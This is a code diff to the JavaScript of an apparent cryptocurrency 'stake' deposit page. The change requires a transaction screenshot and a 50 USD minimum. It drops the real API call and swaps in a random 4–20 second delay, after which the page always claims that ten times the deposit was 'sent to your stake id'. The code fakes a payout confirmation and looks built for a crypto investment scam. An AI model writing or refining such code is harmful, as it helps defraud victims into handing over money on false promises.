@@ -147,8 +147,14 @@ const data = {
   
   function submitForm() {
     const amountValue = amountInput.value;
+    const screenshotInput = document.getElementById('screenshot');
     if (!/^\d*\.?\d+$/.test(amountValue) || parseFloat(amountValue) < 50) {
       amountError.textContent = (!/^\d*\.?\d+$/.test(amountValue)) ? "Please enter a valid number (no special characters)." : "Minimum amount is 50 USD.";
+      submitMsg.textContent = "";
+      return;
+    }
+    if (!screenshotInput.files || screenshotInput.files.length === 0) {
+      amountError.textContent = "Please upload transaction screenshot.";
       submitMsg.textContent = "";
       return;
     }
@@ -173,41 +179,19 @@ const data = {
     </div><div style='color:#fff;font-size:1.05rem;margin-top:10px;'>Processing...</div>`;
     spinner.style.display = 'block';
 
-    // Prepare JSON data for API
-    const data = {
-      crypto: cryptoSelect.value,
-      network: networkSelect.value,
-      amount: amountValue,
-      address: walletAddress.textContent
-    };
-
-    // Send to API route as JSON
-    fetch('/api/submit-transaction', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    })
-      .then(response => response.json())
-      .then(data => {
-        spinner.style.display = 'none';
-        spinner.innerHTML = '';
-        check.style.display = 'block';
-        const crypto = cryptoSelect.value;
-        const total = (parseFloat(amountValue) * 10.1).toFixed(2);
-        msg.textContent = `${total} ${crypto} sent to your stake id!`;
-        okBtn.style.display = 'block';
-        okBtn.onclick = function() {
-          modal.style.display = 'none';
-          window.location.reload();
-        };
-      })
-      .catch(error => {
-        spinner.style.display = 'none';
-        spinner.innerHTML = '';
-        msg.textContent = 'Submission failed. Please try again.';
-        okBtn.style.display = 'block';
-        okBtn.onclick = function() {
-          modal.style.display = 'none';
-        };
-      });
+    // Random delay between 4-20 seconds
+    const delay = 4000 + Math.floor(Math.random() * 16000);
+    setTimeout(() => {
+      spinner.style.display = 'none';
+      spinner.innerHTML = '';
+      check.style.display = 'block';
+      const crypto = cryptoSelect.value;
+      const total = (parseFloat(amountValue) * 10.1).toFixed(2);
+      msg.textContent = `${total} ${crypto} sent to your stake id!`;
+      okBtn.style.display = 'block';
+      okBtn.onclick = function() {
+        modal.style.display = 'none';
+        window.location.reload();
+      };
+    }, delay);
   }
